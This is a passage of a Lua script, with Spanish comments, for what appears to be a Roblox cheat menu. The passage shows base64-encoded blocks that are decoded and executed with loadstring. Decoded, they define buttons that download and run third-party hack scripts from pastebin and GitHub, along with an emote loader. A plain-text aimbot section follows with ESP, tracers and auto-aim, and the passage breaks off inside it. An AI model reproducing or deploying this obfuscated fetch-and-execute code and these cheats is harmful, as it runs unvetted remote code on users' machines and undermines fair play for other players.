J2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9ZWVF5RXZabScpKSgpCiAgIGVuZCwKfSkKCkJ1dHRvbjYgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkVtb3RlcyBSMTUiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9lQ3BpcENUSCIpKSgpCiAgIGVuZCwKfSkKCiBCdXR0b242ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJjMDBsa2lkZCBHdWkgKHNvbG8gbG8gdmVzIHR1KSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXdzY3JpcHRzLm5ldC9yYXcvVW5pdmVyc2FsLVNjcmlwdC1rMDBwa2lkNjY2MC1ndWktdjgtMTY5ODciKSkoKQogICBlbmQsCn0pCgoKIEJ1dHRvbjYgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlRBTEVOVExFU1MgKEF1dG8gcGlhbm8pIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCnBjYWxsKGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9oZWxsb2hlbGxvaGVsbDAxMjMyMS9UQUxFTlRMRVNTL21haW4vVEFMRU5UTEVTUyIsIHRydWUpKSgpCmVuZCkKICAgZW5kLAp9KQoKCiBCdXR0b242ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJIaXRCb3ggRXhwYW5kZXIgR3VpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVmNzay9Sb2Jsb3hTY3JpcHRzL21haW4vSGl0Ym94RXhwYW5kZXIubHVhIikpKCkKICAgZW5kLAp9KQoKQnV0dG9uNiA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiV0lTTCBodWIiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS93aXNsODg0L3dpc2wtaS1Vbml2ZXJzYWwtUHJvamVjdDEvcmVmcy9oZWFkcy9tYWluL1dpc2wnaSUyMFVuaXZlcnNhbCUyMFByb2plY3QlMjBuZXclMjBVSS5sdWEiLCB0cnVlKSkoKQogICBlbmQsCn0pCgoKIEJ1dHRvbjMgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkJsYWNrIGhvbGUoS2F3YWlpIG9wKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpwY2FsbChmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaGVsbG9oZWxsb2hlbGwwMTIzMjEvS0FXQUlJLUFVUkEvbWFpbi9rYXdhaWlfYXVyYS5sdWEiLCB0cnVlKSkoKQplbmQpCiAgIGVuZCwKfSkKCgogQnV0dG9uNiA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiQWxxdWltaWEgaHViIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvSEZ4dXhzOVUiKSkoKQogICBlbmQsCn0pCgogQnV0dG9uNiA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiU2hhZGVycyBwc2hhZGUiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYW5kb21zdHJpbmcwL3BzaGFkZS11bHRpbWF0ZS9yZWZzL2hlYWRzL21haW4vc3JjL2NkLmx1YScpKSgpCiAgIGVuZCwKfSkKCgpCdXR0b242ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJTdWJpciBGUFMiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy84WVoyY2M2ViIpKSgpCiAgIGVuZCwKfSkKCgoKCgoKCgoKCgoKCi0tLVNjcmlwdHMgZGUganVlZ29zLS0tCgpKdWVnb3N0YWI9IF9HLldpbmRvdzpDcmVhdGVUYWIoIkp1ZWdvcyIsIG5pbCkgLS0gVGl0bGUsIEltYWdlCgpib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiRHJlc3MgdG8gaW1wcmVzIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCnBjYWxsKGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9oZWxsb2hlbGxvaGVsbDAxMjMyMS9EVEktR1VJLVYyL21haW4vZHRpX2d1aV92Mi5sdWEiLHRydWUpKSgpCmVuZCkKICAgZW5kLAp9KQoKIGJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJCbG94IEZ1aXQgU3VwZXIgT1AiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80bHBhY2EtcGluL0FyY2VuZXkvcmVmcy9oZWFkcy9tYWluL21haW4ubHVhdSIpKSgpCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlRSUChubyB1bml2ZXJzYWwgcHVkZSBvY2FjaW9uYXIgbGFnKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpwY2FsbChmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaGVsbG9oZWxsb2hlbGwwMTIzMjEvdGhlcmFweS1ndWkvbWFpbi90aGVyYXB5LWd1aS5sdWEiLCB0cnVlKSkoKQogICBlbmQpCiAgIGVuZCwKfSkKCiBib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiUGlnZ3kgKEVTUCB5IFRQIGEgaXRlbXMpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNDhLUktZeloiKSkoKQoKICAgZW5kLAp9KQoKIGJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJBcnNlbmFsIHRodW5kZXIgY2xpZW50IiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL2FwaS5sdWFybW9yLm5ldC9maWxlcy92My9sb2FkZXJzL2I5NWU4ZmVjZGY4MjRlNDFmNGEwMzAwNDRiMDU1YWRkLmx1YSIpKSgpCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkJyZWFraW5nIFBvaW50IiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQ29sZFN0ZXAyL0JyZWFraW5nLVBvaW50LUZ1bm55LVNxdWlkLUhheC9tYWluL0JyZWFraW5nJTIwUG9pbnQlMjBGdW5ueSUyMFNxdWlkJTIwSGF4Iix0cnVlKSkoKTsKCiAgIGVuZCwKfSkKCiBib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiTmF0dXJhbCBkaXNhc3RlciIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzJkZ2VuZXJhbHNwYW0xL3NjcmlwdHMtYW5kLXN0dWZmL21hc3Rlci9zY3JpcHRzL0xvYWRzdHJpbmdVakhJNlJRcHoybzgiLCB0cnVlKSkoKQoKICAgZW5kLAp9KQoKCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlRlbGVraW5lc2lzIChOYXR1cmFsIGRpc2FzdGVyKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhbmRvbXN0cmluZzAvUXdlcnR5L21haW4vcXdlcnR5MS5sdWEiKSkoKQoKICAgZW5kLAp9KQoKIGJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJCbG94IEZydWl0IChuZWNlc2l0YSBrZXkpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMzM0NS1jLWEtdC1zLXUtcy9LbmNyeXB0L3JlZnMvaGVhZHMvbWFpbi9zb3VyY2VzL0Jsb3hGcnVpdC5sdWEiKSkoKQoKICAgZW5kLAp9KQpib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiQmUgYW4gTlBDIG9yIERJRSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JhYzBuSGNrL1NjcmlwdHMvbWFpbi9CZU5wY09yRGllIikpKCJ0Lm1lL2FyY2V1c3hzY3JpcHRzIikKCiAgIGVuZCwKfSkKCiBib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiQmxhZGUgQmFsbChFbWluZW5jZVhMdWEpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRW1pbmVuY2VYTHVhL0JsYWRlLXlvdXItQmFsbHMvbWFpbi9CbGFkZUJhbGxMb2FkZXIubHVhIikpKCkKCgogICBlbmQsCn0pCgpib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiQmxhZGUgQmFsbChhdXRvIHBhcnJ5KSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9zY3JpcHRibG94LmNvbS9yYXcvVVBELUJsYWRlLUJhbGwtb3AtYXV0b3BhcnJ5LXdpdGgtdmlzdWFsaXplci04NjUyIikpKCkKCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJCbGFkZSBCYWxsKG5lY2VzaXRhIGtleSkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9GRkoxL1JvYmxveC1FeHBsb2l0cy9tYWluL3NjcmlwdHMvTG9hZGVyLmx1YSIpKSgpCiAKIAogICAgZW5kLAogfSkKCgoKYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIk5lYnVsYSBodWIgKEJvb2dhIGJvb2dhKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1lvdXN1Y2s3ODAvTmVidWxhLUh1Yi9yZWZzL2hlYWRzL21haW4vYm9vZ2Fib29nYXJlYm9ybicpKSgpCiAgIGVuZCwKfSkKCmJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJCcmVhayBpbiAyIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzM2NUg3QU1yIikpKSgpCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlJlZHogSHViIChCbG94IGZydWl0KSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25ld3JlZHovQmxveEZydWl0cy9yZWZzL2hlYWRzL21haW4vU291cmNlLmx1YXUiKSkoU2V0dGluZ3MpCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gImJ1aWxkIGEgYm9hdCBmb3IgdHJlYXN1cmUiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UaGVSZWFsQXN1L0JBQkZUL3JlZnMvaGVhZHMvbWFpbi9KYW4yNV9Tb3VyY2UubHVhJykpKCkKICAgZW5kLAp9KQoKIGJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJUaHVuZGVyIENsaWVuZChBcnNlbmFsKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FuZHJld2Rhcmt5eW9mZmljaWFsL3RodW5kZXJjbGllbnQvbWFpbi9tYWluLmx1YScpKSgpOwogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlN1cGVyIHJpbmcgbW9kKE5hdHVyYWwgZGlzYXN0ZXIpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvSFNRcXFqVXAnKSkoKQogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlN1cGVyIHJpbmcgdjYgbW9kKE5hdHVyYWwgZGlzYXN0ZXIpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvM1QxR3FLelEnKSkoKQogICBlbmQsCn0p
]]

-- Decodificamos y ejecutamos
loadstring(base64decode(encoded))()







------Animaciones------

-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Aquí va el script codificado en base64
local encoded = [[
bG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgQW5pbWFjaW9uZXNUYWIgPSBfRy5XaW5kb3c6Q3JlYXRlVGFiKCJBbmltYWNpb25lcyIsIG5pbCkKCmxvY2FsIHNlbGVjdGVkU3BlZWQgPSAxCmxvY2FsIGN1cnJlbnRUcmFjayA9IG5pbApsb2NhbCBidXR0b25zQ3JlYXRlZCA9IGZhbHNlCmxvY2FsIGJ1dHRvbnNDcmVhdGVkUjYgPSBmYWxzZQoKLS0gRGV2dWVsdmUgZWwgSHVtYW5vaWQgYWN0dWFsCmxvY2FsIGZ1bmN0aW9uIGdldEh1bWFub2lkKCkKCWxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCWlmIGNoYXIgdGhlbgoJCXJldHVybiBjaGFyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKCWVuZAoJcmV0dXJuIG5pbAplbmQKCi0tIEFzZWd1cmEgcXVlIGVsIEFuaW1hdG9yIGVzdMOpIGRpc3BvbmlibGUKbG9jYWwgZnVuY3Rpb24gZ2V0QW5pbWF0b3IoSHVtYW5vaWQpCglmb3IgaSA9IDEsIDEwIGRvCgkJbG9jYWwgYW5pbWF0b3IgPSBIdW1hbm9pZDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkFuaW1hdG9yIikKCQlpZiBhbmltYXRvciB0aGVuIHJldHVybiBhbmltYXRvciBlbmQKCQlhbmltYXRvciA9IEluc3RhbmNlLm5ldygiQW5pbWF0b3IiKQoJCWFuaW1hdG9yLlBhcmVudCA9IEh1bWFub2lkCgkJdGFzay53YWl0KDAuMDUpCgllbmQKCXJldHVybiBuaWwKZW5kCgotLSBDYXJnYSBhbmltYWNpw7NuIGNvbiBzZWd1cmlkYWQKbG9jYWwgZnVuY3Rpb24gc2FmZVBsYXlBbmltKGFuaW1JZCkKCWxvY2FsIGh1bWFub2lkID0gZ2V0SHVtYW5vaWQoKQoJaWYgbm90IGh1bWFub2lkIHRoZW4gcmV0dXJuIGVuZAoKCWxvY2FsIGFuaW0gPSBJbnN0YW5jZS5uZXcoIkFuaW1hdGlvbiIpCglhbmltLkFuaW1hdGlvbklkID0gYW5pbUlkCgoJbG9jYWwgc3VjY2VzcywgdHJhY2sKCWZvciBhdHRlbXB0ID0gMSwgNSBkbwoJCWxvY2FsIGFuaW1hdG9yID0gZ2V0QW5pbWF0b3IoaHVtYW5vaWQpCgkJaWYgbm90IGFuaW1hdG9yIHRoZW4KCQkJd2Fybigi4p2MIE5vIHNlIHB1ZG8gb2J0ZW5lciBBbmltYXRvci4iKQoJCQlyZXR1cm4KCQllbmQKCQlzdWNjZXNzLCB0cmFjayA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJcmV0dXJuIGFuaW1hdG9yOkxvYWRBbmltYXRpb24oYW5pbSkKCQllbmQpCgkJaWYgc3VjY2VzcyBhbmQgdHJhY2sgdGhlbgoJCQl0cmFjazpQbGF5KCkKCQkJdHJhY2s6QWRqdXN0U3BlZWQoc2VsZWN0ZWRTcGVlZCkKCQkJY3VycmVudFRyYWNrID0gdHJhY2sKCQkJcmV0dXJuCgkJZW5kCgkJdGFzay53YWl0KDAuMSkKCWVuZAoJd2Fybigi4pqg77iPIE5vIHNlIHB1ZG8gY2FyZ2FyIGxhIGFuaW1hY2nDs24gdHJhcyB2YXJpb3MgaW50ZW50b3MuIikKZW5kCgotLSBCb3RvbmVzIHBhcmEgYW5pbWFjaW9uZXMgUjE1CmxvY2FsIGZ1bmN0aW9uIHNldHVwVUlfUjE1KCkKCWlmIGJ1dHRvbnNDcmVhdGVkIHRoZW4gcmV0dXJuIGVuZAoJYnV0dG9uc0NyZWF0ZWQgPSB0cnVlCgoJQW5pbWFjaW9uZXNUYWI6Q3JlYXRlU2VjdGlvbigiQW5pbWFjaW9uZXMgUjE1IikKCglBbmltYWNpb25lc1RhYjpDcmVhdGVCdXR0b24oewoJCU5hbWUgPSAi4p2MIFF1aXRhciBBbmltYWNpw7NuIiwKCQlDYWxsYmFjayA9IGZ1bmN0aW9uKCkKCQkJbG9jYWwgaHVtYW5vaWQgPSBnZXRIdW1hbm9pZCgpCgkJCWlmIGh1bWFub2lkIHRoZW4KCQkJCWZvciBfLCB0cmFjayBpbiBwYWlycyhodW1hbm9pZDpHZXRQbGF5aW5nQW5pbWF0aW9uVHJhY2tzKCkpIGRvCgkJCQkJdHJhY2s6U3RvcCgpCgkJCQllbmQKCQkJZW5kCgkJCWN1cnJlbnRUcmFjayA9IG5pbAoJCWVuZAoJfSkKCglBbmltYWNpb25lc1RhYjpDcmVhdGVTbGlkZXIoewoJCU5hbWUgPSAiVmVsb2NpZGFkIGRlIGFuaW1hY2nDs24iLAoJCVJhbmdlID0gezAsIDEwfSwKCQlJbmNyZW1lbnQgPSAwLjEsCgkJU3VmZml4ID0gIngiLAoJCUN1cnJlbnRWYWx1ZSA9IHNlbGVjdGVkU3BlZWQsCgkJQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKCQkJc2VsZWN0ZWRTcGVlZCA9IHZhbHVlCgkJCWlmIGN1cnJlbnRUcmFjayB0aGVuCgkJCQljdXJyZW50VHJhY2s6QWRqdXN0U3BlZWQodmFsdWUpCgkJCWVuZAoJCWVuZAoJfSkKCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQlsb2NhbCBzdWNjZXNzLCBlbW90ZXMgPSBwY2FsbChmdW5jdGlvbigpCgkJCWxvY2FsIHJhdyA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0pveXN0aWNrcGxheXMvQUZFTS9yZWZzL2hlYWRzL21haW4vZW1vdGVzLmpzb24iKQoJCQlyZXR1cm4gSHR0cFNlcnZpY2U6SlNPTkRlY29kZShyYXcpCgkJZW5kKQoKCQlpZiBzdWNjZXNzIHRoZW4KCQkJZm9yIF8sIGVtb3RlIGluIGlwYWlycyhlbW90ZXMpIGRvCgkJCQlpZiBlbW90ZS5uYW1lIGFuZCBlbW90ZS5hbmltYXRpb25pZCB0aGVuCgkJCQkJQW5pbWFjaW9uZXNUYWI6Q3JlYXRlQnV0dG9uKHsKCQkJCQkJTmFtZSA9IGVtb3RlLm5hbWUsCgkJCQkJCUNhbGxiYWNrID0gZnVuY3Rpb24oKQoJCQkJCQkJbG9jYWwgaHVtYW5vaWQgPSBnZXRIdW1hbm9pZCgpCgkJCQkJCQlpZiBodW1hbm9pZCB0aGVuCgkJCQkJCQkJZm9yIF8sIHRyYWNrIGluIHBhaXJzKGh1bWFub2lkOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KCQkJCQkJCQkJdHJhY2s6U3RvcCgpCgkJCQkJCQkJZW5kCgkJCQkJCQkJc2FmZVBsYXlBbmltKGVtb3RlLmFuaW1hdGlvbmlkKQoJCQkJCQkJZW5kCgkJCQkJCWVuZAoJCQkJCX0pCgkJCQllbmQKCQkJZW5kCgkJZWxzZQoJCQl3YXJuKCLinYwgRXJyb3IgYWwgY2FyZ2FyIGVtb3RlcyBSMTU6IiwgZW1vdGVzKQoJCWVuZAoJZW5kKQplbmQKCi0tIEJvdG9uZXMgcGFyYSBhbmltYWNpb25lcyBSNgpsb2NhbCBmdW5jdGlvbiBzZXR1cFVJX1I2KCkKCWlmIGJ1dHRvbnNDcmVhdGVkUjYgdGhlbiByZXR1cm4gZW5kCglidXR0b25zQ3JlYXRlZFI2ID0gdHJ1ZQoKCUFuaW1hY2lvbmVzVGFiOkNyZWF0ZVNlY3Rpb24oIkFuaW1hY2lvbmVzIFI2IikKCglBbmltYWNpb25lc1RhYjpDcmVhdGVCdXR0b24oewoJCU5hbWUgPSAi4p2MIFF1aXRhciBBbmltYWNpw7NuIFI2IiwKCQlDYWxsYmFjayA9IGZ1bmN0aW9uKCkKCQkJbG9jYWwgaHVtYW5vaWQgPSBnZXRIdW1hbm9pZCgpCgkJCWlmIGh1bWFub2lkIHRoZW4KCQkJCWZvciBfLCB0cmFjayBpbiBwYWlycyhodW1hbm9pZDpHZXRQbGF5aW5nQW5pbWF0aW9uVHJhY2tzKCkpIGRvCgkJCQkJdHJhY2s6U3RvcCgpCgkJCQllbmQKCQkJZW5kCgkJCWN1cnJlbnRUcmFjayA9IG5pbAoJCWVuZAoJfSkKCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQlsb2NhbCBzdWNjZXNzLCBlbW90ZXMgPSBwY2FsbChmdW5jdGlvbigpCgkJCWxvY2FsIHJhdyA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2lVQ0tXWEtWIikKCQkJcmV0dXJuIEh0dHBTZXJ2aWNlOkpTT05EZWNvZGUocmF3KQoJCWVuZCkKCgkJaWYgc3VjY2VzcyB0aGVuCgkJCWZvciBfLCBlbW90ZSBpbiBpcGFpcnMoZW1vdGVzKSBkbwoJCQkJaWYgZW1vdGUubmFtZSBhbmQgZW1vdGUuYW5pbWF0aW9uaWQgdGhlbgoJCQkJCUFuaW1hY2lvbmVzVGFiOkNyZWF0ZUJ1dHRvbih7CgkJCQkJCU5hbWUgPSAiW1I2XSAiIC4uIGVtb3RlLm5hbWUsCgkJCQkJCUNhbGxiYWNrID0gZnVuY3Rpb24oKQoJCQkJCQkJbG9jYWwgaHVtYW5vaWQgPSBnZXRIdW1hbm9pZCgpCgkJCQkJCQlpZiBodW1hbm9pZCB0aGVuCgkJCQkJCQkJZm9yIF8sIHRyYWNrIGluIHBhaXJzKGh1bWFub2lkOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KCQkJCQkJCQkJdHJhY2s6U3RvcCgpCgkJCQkJCQkJZW5kCgkJCQkJCQkJc2FmZVBsYXlBbmltKGVtb3RlLmFuaW1hdGlvbmlkKQoJCQkJCQkJZW5kCgkJCQkJCWVuZAoJCQkJCX0pCgkJCQllbmQKCQkJZW5kCgkJZWxzZQoJCQl3YXJuKCLinYwgRXJyb3IgYWwgY2FyZ2FyIGVtb3RlcyBSNjoiLCBlbW90ZXMpCgkJZW5kCgllbmQpCmVuZAoKLS0gQ2FyZ2EgbG9zIGJvdG9uZXMgYWwgcHJlc2lvbmFyCkFuaW1hY2lvbmVzVGFiOkNyZWF0ZUJ1dHRvbih7CglOYW1lID0gIuKWtu+4jyBDYXJnYXIgQW5pbWFjaW9uZXMgUjE1IChQaXNhIHNvbG8gMSB2ZXopIiwKCUNhbGxiYWNrID0gc2V0dXBVSV9SMTUKfSkKCkFuaW1hY2lvbmVzVGFiOkNyZWF0ZUJ1dHRvbih7CglOYW1lID0gIuKWtu+4jyBDYXJnYXIgQW5pbWFjaW9uZXMgUjYgKFBpc2Egc29sbyAxIHZleikiLAoJQ2FsbGJhY2sgPSBzZXR1cFVJX1I2Cn0pCgotLSBSZXNldCBkZSBhbmltYWNpb25lcyBhbCByZXNwYXduCkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJY3VycmVudFRyYWNrID0gbmlsCmVuZCk=
]]

-- Decodificamos y ejecutamos
loadstring(base64decode(encoded))()










----AIMBOT---
AimbotTab = Window:CreateTab("Aimbot", nil)

-- Configuración
local AimbotSettings = {
    Enabled = false,
    ESPEnabled = false,
    FOVRadius = 350,
    FOVColor = Color3.fromRGB(0, 0, 255),
    ESPColor = Color3.fromRGB(0, 0, 255),
    ESPSizeMultiplier = 5,
    Sensitivity = 0,
    AimPart = "Head",
    TeamCheckEnabled = false,
    TracersEnabled = false,
    TracerColor = Color3.fromRGB(0, 0, 255),
    AutoAimEnabled = false,
    OnlyClosePlayers = false, -- 🔥 NUEVO: solo apuntar a cercanos
    CloseDistanceThreshold = 100,
    WallCheck = false, -- 🔥 NUEVO: distancia en studs para considerar "cercano"
}

local Camera = workspace.CurrentCamera
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Holding = false

-- FOV circle
local FOVCircle = Drawing.new("Circle")
FOVCircle.Filled = false
FOVCircle.Thickness = 1
FOVCircle.NumSides = 64
FOVCircle.Transparency = 0.7
FOVCircle.Visible = false

-- Obtener el jugador más cercano
local function GetClosestPlayer()
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, v in pairs(Players:GetPlayers()) do
